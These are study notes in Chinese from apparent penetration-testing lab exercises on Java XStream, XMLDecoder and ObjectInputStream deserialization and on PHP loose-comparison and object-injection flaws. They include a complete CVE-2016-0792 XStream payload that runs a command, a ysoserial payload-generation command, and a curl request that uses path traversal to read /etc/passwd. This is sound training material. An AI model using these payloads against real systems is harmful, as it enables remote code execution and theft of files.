### XMLDecoder
將models.CTFSignature改成ProcessBuilder，不需要id將id刪除
增加一個array及兩個void指令，還有其他java.lang.runtime方法也可以嘗試

###CVE-2016-0792
主要為使用了XStream反序列化方法，植入以下payload可以取得RCE
<map>
  <entry>
    <groovy.util.Expando>
      <expandoProperties>
        <entry>
          <string>hashCode</string>
          <org.codehaus.groovy.runtime.MethodClosure>
            <delegate class="groovy.util.Expando"/>
            <owner class="java.lang.ProcessBuilder">
              <command>
                <string>/usr/local/bin/score</string>
                <string>e9f861c4-1b4c-4036-a4bc-bbc8d0295148</string>
              </command>
            </owner>
            <method>start</method>
          </org.codehaus.groovy.runtime.MethodClosure>
        </entry>
      </expandoProperties>
    </groovy.util.Expando>
    <int>1</int>
  </entry>
</map>

###ObjectInputStream
主要為java反序列化漏洞，在cookie中若是有看到rO0開頭，就代表可能存在漏洞，就使用yso serial生成payload，每個方法都要測試
Cookie: auth=rO0ABXNyAA92dWxuZXJhYmxlLlVzZXI5zyo_QTFh_wIAAUwACHVzZXJuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7eHB0AAR0ZXN0
java -jar ysoserial-0.0.4.jar Spring1 '/usr/local/bin/score e9f861c4-1b4c-4036-a4bc-bbc8d0295148'|base64  |pbcopy



###PHP COMPARISONS
主要為php在做signature比較的時候，若是使用==，就可能存在比較漏洞，例如"0efdsfs"==0這個是成立的，所以在請求過程中
將uuid一直添加../././././讓他生成不同的signare，signare輸入0就有可能達成漏洞
curl -X POST -H "Content-Type: application/json" -d '{ "token": "Tzo0OiJVc2VyIjoyOntzOjI6ImlkIjtpOjE7czo1OiJsb2dpbiI7czo2OiJuZmNhaHgiO30%3D--96b5b159adb6589b16850745b5353ba6", "uuid": "../../../../../../././././etc/passwd", "sig": 0}' http://ptl-dc6f4ed8-135a1cde.libcurl.so/file
拿到任意檔案查看漏洞後，根據/var/www/index.php可以看到引入幾個php檔案
可以看到user.php中有兩個function，一個是序列化token，一個是反序列化token
__wakeup() when an object is deserialized.
__destruct() when an object is deleted.
__toString() when an object is converted to a string.
通常在反序列化過程，會用到以上三個方法，可以透過這三個方法來達到RCE
可以看到在file.php中__destruct()會開啟一個檔案，並且寫入action，uuid，owner，並且action這個參數是來自於
    $fd = fopen($this->logfile, 'a'); 
    fwrite($fd, $_GET['action'].":".$this->uuid.' by '.$this->owner."\

首先創建一個malicious.php，將需要的函數放入，調整後可生成序列化的malicious code
在router.php內有login,register方法是會對token做反序列化可達到創建文件